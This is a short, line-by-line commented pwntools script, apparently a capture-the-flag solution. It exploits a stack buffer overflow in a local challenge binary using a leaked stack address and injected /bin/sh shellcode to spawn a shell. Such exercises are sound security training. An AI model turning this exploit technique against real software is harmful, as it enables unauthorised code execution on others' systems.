from pwn import *
# Set the architecture to amd64 for shellcode generation
context.arch = "amd64"
# Load the ELF binary into the "elf" object for analysis
elf = ELF("./chall_03")
# Generate shellcode using the shellcraft module, which provides shellcode templates
shellcode = asm(shellcraft.sh())
# Calculate the length of the generated shellcode
len(shellcode)
# Create a process object for the executable "chall_03"
p = process("./chall_03")
# Receive data from the process until a newline character is encountered
p.recvuntil("\n")
# Receive data from the process and store it in the variable "leak"
leak = p.recv()
# Extracting the stack leak value from the received data and convert it to an integer in base 16 (hexadecimal)
stackleak = int(leak[-15:], 16)
# Crafting the payload: shellcode followed by 280 bytes of 's' characters and then the little-endian representation of the stack leak address
payload = shellcode + b's' * 280 + p64(stackleak)
p.sendline(payload)
p.interactive()

